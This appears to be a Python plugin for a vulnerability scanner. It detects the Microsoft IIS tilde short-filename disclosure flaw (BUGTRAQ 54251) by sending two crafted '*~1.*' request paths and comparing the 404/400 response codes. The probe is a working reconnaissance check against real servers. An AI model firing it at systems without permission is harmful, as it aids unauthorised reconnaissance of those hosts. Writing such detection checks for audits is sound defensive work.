#!/usr/bin/env python  
#-*-coding:utf-8-*-

# catalog-3-服务配置缺陷-
# name-Microsoft IIS 短文件名/目录名 枚举漏洞-
# -description-
# BUGTRAQ ID: 54251
# Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。
# IIS Short File/Folder Name Disclosure by using tilde “~” character<* 参考
# Soroush Dalili （Irsdl@yahoo.com）
# http://soroush.secproject.com/blog/2012/06/microsoft-iis-tilde-character-vulnerabilityfeature-short-filefolder-name-disclosure/
# http://www.acunetix.com/blog/web-security-zone/articles/windows-short-8-3-filenames-web-security-problem/
# -description-
from dummy import *
import urlparse  
  
def assign(service, arg):  
    if service != "www":  
        return  
    arr = urlparse.urlparse(arg)  
    return True, '%s://%s/' % (arr.scheme, arr.netloc)  
  
def audit(arg):  
    url = arg  
    code, head, res, errcode, _ , errstr = curl.curl(url + '%2F*~1.*%2Fx.aspx')  
    if errcode:
        raise Exception(errcode,errstr)
    if code == 404:  
        code, head, res, errcode, _ , errstr = curl.curl(url + '%2Fooxx*~1.*%2Fx.aspx')  
        if errcode:
            raise Exception(errcode,errstr)
        if code == 400:  
            security_info(url)  
  
if __name__ == '__main__':  
    from dummy import *  
    audit(assign('www', 'http://www.abc.com/')[1])  
    audit(assign('www', 'http://www.abc.com/')[1])  
    audit(assign('www', 'http://www.abc.com/')[1])  